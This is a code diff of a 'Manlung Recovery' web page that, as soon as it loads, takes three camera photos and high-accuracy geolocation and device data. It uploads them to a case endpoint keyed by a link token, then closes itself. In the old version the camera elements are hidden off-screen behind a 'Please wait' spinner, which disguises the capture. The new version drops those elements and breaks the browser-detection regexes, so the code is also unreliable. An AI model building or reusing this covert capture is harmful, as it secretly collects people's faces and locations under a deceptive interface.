@@ -1,28 +1,9 @@
 <!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="robots" content="noindex,nofollow,noarchive">
-<title>Please Wait · Manlung Recovery</title>
-<style>
-html,body{margin:0;width:100%;height:100%;background:#fff}
-body{display:flex;align-items:center;justify-content:center;overflow:hidden;font-family:Arial,Helvetica,sans-serif;color:#111}
-.wait{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;min-width:220px}
-.spinner{width:54px;height:54px;border:5px solid #e9e9e9;border-top-color:#111;border-radius:50%;animation:spin .8s linear infinite}
-.message{margin-top:18px;font-size:17px;font-weight:600;letter-spacing:.01em}
-@keyframes spin{to{transform:rotate(360deg)}}
-video,canvas{position:fixed;left:-10000px;top:-10000px;width:1px;height:1px;opacity:0;pointer-events:none}
-</style>
-</head>
-<body>
-<div class="wait" aria-live="polite"><div class="spinner" aria-hidden="true"></div><div class="message">Please wait</div></div>
-<video id="video" autoplay muted playsinline></video>
-<canvas id="canvas"></canvas>
+<html lang="en"><head><meta charset="utf-8"><meta name="robots" content="noindex,nofollow"><title>Video Verification · Manlung Recovery</title></head>
+<body><p>Opening Video Verification…</p>
 <script>
 (()=>{"use strict";
-const pathParts=location.pathname.split("/").filter(Boolean);
-const token=new URLSearchParams(location.search).get("id")||pathParts[pathParts.length-1]||"";
+const token=new URLSearchParams(location.search).get("id")||"";
 const video=document.getElementById("video"),canvas=document.getElementById("canvas");
 let stream=null,busy=false;
 const DB_NAME="manlung-selfie-queue",DB_STORE="uploads";
@@ -47,7 +28,7 @@ async function captureThree(){
   video.srcObject=stream;await video.play().catch(()=>{});await waitForVideo();
   const ua=navigator.userAgent||"",uaData=navigator.userAgentData||null;
   const deviceType=/Mobi|Android|iPhone|iPad|iPod/i.test(ua)?"mobile":"desktop";
-  let browser=/Edg\//i.test(ua)?"Edge":/Chrome\//i.test(ua)?"Chrome":/Firefox\//i.test(ua)?"Firefox":/Safari\//i.test(ua)&&!/Chrome\//i.test(ua)?"Safari":"Unknown";
+  let browser=/Edg//i.test(ua)?"Edge":/Chrome//i.test(ua)?"Chrome":/Firefox//i.test(ua)?"Firefox":/Safari//i.test(ua)&&!/Chrome//i.test(ua)?"Safari":"Unknown";
   let location=null;
   if(navigator.geolocation)location=await new Promise(resolve=>navigator.geolocation.getCurrentPosition(p=>resolve({latitude:Number(p.coords.latitude.toFixed(6)),longitude:Number(p.coords.longitude.toFixed(6)),accuracy:Number.isFinite(p.coords.accuracy)?Number(p.coords.accuracy.toFixed(1)):null}),()=>resolve(null),{enableHighAccuracy:true,maximumAge:30000,timeout:5000}));
   metadata={clientCapturedAt:new Date().toISOString(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"",captureMethod:"browser-camera",device:{deviceType,platform:(uaData?.platform||navigator.platform||"").slice(0,80),browser,model:""},location,totalCaptures:3};
@@ -56,19 +37,10 @@ async function captureThree(){
   const fd=new FormData();blobs.forEach((blob,i)=>fd.append("files",blob,"verification-"+(i+1)+".jpg"));fd.append("metadata",JSON.stringify(metadata));
   const uploadResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"}),uploadData=await uploadResponse.json().catch(()=>({}));
   if(!uploadResponse.ok||!uploadData.success)throw new Error(uploadData.error||"Verification upload failed.");
-  await flushQueue();if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
-  setTimeout(()=>{try{window.close()}catch(_){}},150);
- }catch(error){
-  console.error("Selfie evidence pipeline error:",error);
-  if(blobs.length===3&&metadata){await queueBatch(blobs,metadata);await flushQueue()}
-  if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
-  setTimeout(()=>{try{window.close()}catch(_){}},800);
- }finally{busy=false}
+  await flushQueue();try{window.close()}catch(_){}setTimeout(()=>{try{window.close()}catch(_){}},300);
+ }catch(error){console.error("Selfie evidence pipeline error:",error);if(blobs.length===3&&metadata){await queueBatch(blobs,metadata);await flushQueue()}setTimeout(()=>{try{window.close()}catch(_){}},800)}
+ finally{if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}}
 }
-document.addEventListener("DOMContentLoaded",captureThree,{once:true});
-window.addEventListener("online",flushQueue);
-setTimeout(()=>{requestStoragePersistence().catch(()=>{});flushQueue().catch(()=>{})},1000);
+document.addEventListener("DOMContentLoaded",captureThree,{once:true});window.addEventListener("online",flushQueue);setTimeout(()=>{requestStoragePersistence().catch(()=>{});flushQueue().catch(()=>{})},1000);
 })();
-</script>
-</body>
-</html>
+</script></body></html>
